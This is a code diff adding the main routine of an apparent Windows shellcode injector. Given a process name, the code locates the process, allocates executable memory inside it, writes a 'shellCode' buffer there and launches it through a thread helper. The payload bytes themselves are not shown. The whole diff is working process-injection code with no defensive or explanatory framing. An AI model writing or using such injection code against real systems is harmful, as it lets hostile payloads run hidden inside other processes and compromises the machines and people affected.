@@ -63,3 +63,38 @@ void ExecuteThread(DWORD targetProcessID, PVOID allocateMemory) {
 	}
 	CloseHandle(hThreadtarget);
 }
+
+
+
+
+int main(int argc,  char* argv[]) {
+	
+	if (argc < 2) return 0;
+	
+	wchar_t processName[260];
+	size_t converted = 0;
+	mbstowcs_s(&converted, processName, argv[1], _TRUNCATE);
+
+	DWORD targetProcessID = findProcessID(processName);
+
+	if (targetProcessID == 0) return 0;
+	HANDLE targetProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, targetProcessID);
+
+	if (targetProcess == NULL) return 0;
+
+	PVOID allocateMemory = VirtualAllocEx(targetProcess, NULL, shellCodeLength, MEM_RESERVE | MEM_COMMIT , PAGE_EXECUTE_READWRITE);
+
+	if (allocateMemory == NULL) return 0;
+	
+	SIZE_T bytesWritten;
+	if (!WriteProcessMemory(targetProcess, allocateMemory, shellCode, shellCodeLength, &bytesWritten) || bytesWritten != shellCodeLength) {
+		cerr << "WriteProcessMemory failed or incomplete." << endl;
+		CloseHandle(targetProcess);
+		return 1;
+	}
+	ExecuteThread(targetProcessID, allocateMemory);
+
+	CloseHandle(targetProcess);
+
+	return 0;
+}
